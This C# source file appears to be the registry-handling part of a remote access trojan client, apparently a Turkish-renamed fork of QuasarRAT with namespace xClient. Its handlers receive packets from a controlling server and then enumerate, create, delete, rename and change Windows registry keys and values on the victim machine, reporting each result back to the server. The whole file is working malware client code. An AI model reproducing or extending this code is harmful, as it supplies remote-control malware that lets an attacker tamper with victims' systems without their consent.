using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Eklentiler;
using xClient.KuuhakuÇekirdek.KayıtDefteri;

namespace xClient.KuuhakuÇekirdek.Eylemler
{
    public static partial class Eylemİşleyicisi
    {

        public static void HandleGetRegistryKey(Paketler.ServerPaketleri.DoLoadRegistryKey packet, Client client)
        {
            try
            {

                Sikerxd = new RegistrySeeker();

                Paketler.ClientPaketleri.GetRegistryKeysResponse responsePacket = new Paketler.ClientPaketleri.GetRegistryKeysResponse();

                Sikerxd.SearchComplete += (object o, SearchCompletedEventArgs e) =>
                {
                    responsePacket.Matches = e.Matches.ToArray();
                    responsePacket.RootKey = packet.RootKeyName;

                    responsePacket.Execute(client);
                };
                if (packet.RootKeyName == null)
                {
                    Sikerxd.Start(new RegistrySeekerParams(null));
                }
                else
                {
                    Sikerxd.Start(packet.RootKeyName);
                }
            }
            catch
            { }
        }

        #region Registry Key Edit

        public static void HandleCreateRegistryKey(Paketler.ServerPaketleri.DoCreateRegistryKey packet, Client client)
        {
            Paketler.ClientPaketleri.GetCreateRegistryKeyResponse responsePacket = new Paketler.ClientPaketleri.GetCreateRegistryKeyResponse();
            string errorMsg = "";
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;

            responsePacket.Match = new RegSeekerMatch(newKeyName, new List<RegValueData>(), 0);
            responsePacket.ParentPath = packet.ParentPath;

            responsePacket.Execute(client);
        }

        public static void HandleDeleteRegistryKey(Paketler.ServerPaketleri.DoDeleteRegistryKey packet, Client client)
        {
         Paketler.ClientPaketleri.GetDeleteRegistryKeyResponse responsePacket = new Paketler.ClientPaketleri.GetDeleteRegistryKeyResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.KeyName = packet.KeyName;

            responsePacket.Execute(client);
        }

        public static void HandleRenameRegistryKey(Paketler.ServerPaketleri.DoRenameRegistryKey packet, Client client)
        {
           Paketler.ClientPaketleri.GetRenameRegistryKeyResponse responsePacket = new Paketler.ClientPaketleri.GetRenameRegistryKeyResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.OldKeyName = packet.OldKeyName;
            responsePacket.NewKeyName = packet.NewKeyName;

            responsePacket.Execute(client);
        }

        #endregion

        #region RegistryValue Edit

        public static void HandleCreateRegistryValue(Paketler.ServerPaketleri.DoCreateRegistryValue packet, Client client)
        {
           Paketler.ClientPaketleri.GetCreateRegistryValueResponse responsePacket = new Paketler.ClientPaketleri.GetCreateRegistryValueResponse();
            string errorMsg = "";
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = new RegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
            responsePacket.KeyPath = packet.KeyPath;

            responsePacket.Execute(client);
        }

        public static void HandleDeleteRegistryValue(Paketler.ServerPaketleri.DoDeleteRegistryValue packet, Client client)
        {
       Paketler.ClientPaketleri.GetDeleteRegistryValueResponse responsePacket = new Paketler.ClientPaketleri.GetDeleteRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = packet.ValueName;
            responsePacket.KeyPath = packet.KeyPath;

            responsePacket.Execute(client);
        }

        public static void HandleRenameRegistryValue(Paketler.ServerPaketleri.DoRenameRegistryValue packet, Client client)
        {
            Paketler.ClientPaketleri.GetRenameRegistryValueResponse responsePacket = new Paketler.ClientPaketleri.GetRenameRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.OldValueName = packet.OldValueName;
            responsePacket.NewValueName = packet.NewValueName;

            responsePacket.Execute(client);
        }

        public static void HandleChangeRegistryValue(Paketler.ServerPaketleri.DoChangeRegistryValue packet, Client client)
        {
            Paketler.ClientPaketleri.GetChangeRegistryValueResponse responsePacket = new Paketler.ClientPaketleri.GetChangeRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.Value = packet.Value;

            responsePacket.Execute(client);
        }

        #endregion
    }
}
